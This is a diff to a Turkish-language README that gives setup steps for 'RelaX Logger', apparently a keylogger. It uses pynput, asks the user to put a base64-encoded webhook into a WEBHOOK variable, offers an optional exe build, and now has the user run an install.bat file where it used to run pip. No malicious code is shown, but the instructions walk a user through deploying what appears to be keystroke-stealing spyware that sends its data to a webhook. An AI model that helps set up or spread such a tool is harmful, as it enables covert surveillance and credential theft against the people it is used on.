@@ -4,8 +4,8 @@
 RelaX Logger Tüm Hakları Saklıdır!
 
 ## 🔍 〢 Gereksnimler
-- Python (Bendeki Sürüm: 3.11.2)
-- Bendeki Python Linki: https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe
+- Python (Bendeki Sürüm: 3.11.2) 
+- Bendeki Python İndirme Linki: https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe
   
 - Git (Depoyu Klonlamak İçin Ama İsterseniz İndirebilirsinizde)
 - (64 Bit) https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe
@@ -20,14 +20,12 @@ git clone https://github.com/RelaX0001/RelaX-Looger.git
 ```
 Öncelikle İndirdiğiniz Ya'da Klonladığınız RelaX Logger.rar Dosyasını Klasöre Ayıklayın.
 
-Sonra Cmd Yi Açıp Cmd Komutları İle RelaX Logger Ana Dizinine Girin.
-
-Sonra Orada Şu Kodu Çalıştırın
-
 ## ⚙️ 〢 Kurulum
-```
-pip install -r requirements.txt
-```
+
+Oradaki 🟡 install.bat 🟡 Dosyasını Çalıştırın!
+
+Eğer Hata Alırsanız Blinki Pythonu Kurulurken Pip Kurulmamıştır!
+
 🔴🟢Eğer Pip Kurulu Değilse🔴🟢
 
 Cmd Komut Satırına Şunu Yazın
@@ -50,11 +48,6 @@ WEBHOOK = "" # Tırnak İçine Kopyaladığnız Base 64 Kodunu Yazın.
 Evet Bitti.
 
 🟡[[[Eğer Exe'ye Çevirmek İsterseniz!]]]🟡
-
-1- Cmd Yi Açıp Koutunu Çalıştırın
-```
-pip install pynput
-```
 
 2- Yine Cmd İle RelaX Logger Dosya Dizininin İçinde Şu Kodlardan Birisini Çalıştırın!
 
